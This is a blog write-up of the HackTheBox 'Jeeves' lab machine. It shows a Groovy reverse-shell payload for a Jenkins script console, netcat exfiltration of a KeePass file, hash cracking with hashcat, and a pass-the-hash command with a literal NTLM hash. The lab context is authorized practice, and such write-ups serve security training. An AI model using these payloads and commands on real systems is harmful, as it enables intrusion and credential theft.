---
layout: single
title:  Jeeves-HackTheBox
date: 2021-12-18
classes: wide
header:
  teaser: 
tags:
  - ctf
  - HackTheBox
--- 


Jeeves is in reference to a Jenkins server that we will eventually be exploiting. Super fun recap box!

![](/assets/images/Jeeves/jeevessite1.PNG)
Starting off by scanning ports.
![](/assets/images/Jeeves/jeevesscan.PNG)

See there is at least one webserver. Fuzz directories, ran nikto etc. Nothing of real interest there.
Check out the second Jetty webserver spotted in the nmap scan. gobuster until we find askjeeves	

![](/assets/images/Jeeves/jeeves1finsihsed.PNG)

Stumble accross the scripting console
![](/assets/images/Jeeves/jeevescli.PNG)

Do research to find ways to exploit this
exploit jenkins with groovy script 
https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution
![](/assets/images/Jeeves/jeevesscript.PNG)


https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy

String host="<LOCAL-IP>";
int port=1234;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

![](/assets/images/Jeeves/jeevesusershell.PNG)  
  
We get a user shell as kohsuke. 
After a little bit of recon we come accross CEH.kdbx 
  
This file format appears to be a keepass password file. Before we attempt to see the password we have to download the file to our local machine. 
  
![](/assets/images/Jeeves/jeeveskdbx.PNG)

 I achieved this by downloading a netcat executable from the user shell we are in from a python http server that we host.
  
"powershell wget "http://localip:8000/nc.exe" -outfile nc.exe"
The virtual machine cannot reach out to github to download the file from there
Then "nc -lnvp <port> > CEH.kdbx" on your local machine and "nc.exe <local-ip> <same-port> < "CEH.kdbx" on the victim machine

We need a password to open the kdbx file. Why dont we crack it? 
I used this article as guidance, the main points summarized are
                                                                                               
https://www.rubydevices.com.au/blog/how-to-hack-keepass 
download and use keepass2john on the kdbx file.

./keepass2john CEH.kdbx > CEH.hash
Remove name of keepass database from the new hashfile. 
use hashcat to crack the file.

./hashcat -m 13400 -a 0 -w 1 CEH.hash <wordlist-file> 
 moonshine1 is the password to the keepass file
  
 ![](/assets/images/Jeeves/jeeveskeepass1.png)
 
 ![](/assets/images/Jeeves/jeeveskeepass2.png)
 
 We find a hash in the keepass file under the title of Backup stuff
 From here I got stuck for a while. While researching I found the tool pth-winexe
 read the docs, run to get admin! 
  
 pth-winexe --user=jeeves/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 --system //10.10.10.63 cmd.ex
 
 we now have a root shell!
 ![](/assets/images/Jeeves/jeevesroot.PNG)

admin has hm.txt file redirecting to actual file
![](/assets/images/Jeeves/jeeveshn.PNG)

 get-content .\hm.txt -stream root.txt
and we get root flag :)
